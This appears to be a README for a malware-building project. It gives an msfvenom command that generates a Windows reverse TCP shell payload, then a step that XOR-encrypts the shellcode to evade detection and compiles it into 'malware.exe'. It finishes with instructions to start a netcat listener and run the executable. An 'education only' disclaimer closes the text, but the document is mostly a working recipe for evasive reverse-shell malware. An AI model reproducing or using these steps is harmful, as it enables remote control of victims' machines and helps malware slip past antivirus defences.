### Prerequesite
1. [Visual Studio](https://visualstudio.microsoft.com/downloads/)
2. [Python3](https://www.python.org/downloads/)
3. [Metasploit Framework](https://www.metasploit.com/download)

### Initiate
##### Generate Shellcode
Run this command to generate the shellcode via Msfvenom.
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f raw -o payload.bin
```
##### Encrypt The Generated Payload 
Run this command to encrypt the generated shellcode and generating `malware.exe`.
```sh
python3 xorencrypt.py
```
### Execute
1. Run `compiler.bat` to compile all of them, then you will have `malware.exe`
2. Run the listener (such as [Netcat] (https://github.com/diegocr/netcat/) tool)
3. Run `malware.exe`

***All stuffs are only for education purpose!***
